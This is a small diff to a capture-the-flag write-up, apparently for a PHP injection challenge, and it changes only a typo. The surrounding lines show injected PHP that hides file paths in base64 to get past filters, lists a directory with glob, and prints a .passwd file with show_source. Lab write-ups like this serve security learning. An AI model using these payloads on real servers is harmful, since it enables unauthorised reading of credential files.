@@ -126,7 +126,7 @@ print_r(glob(implode(array(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGF
 
 ![Glob command in php](https://image.noelshack.com/fichiers/2024/01/2/1704201285-screenshot-from-2024-01-02-14-14-02.png)
 
-We can see that there is a .passwd file so we just now have to open with the following command:
+We can see that there is a .passwd file so we just now have to open it with the following command:
 
 ```php 
 echo show_source(implode(array(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGFzc3dkLy5wYXNzd2Q))));
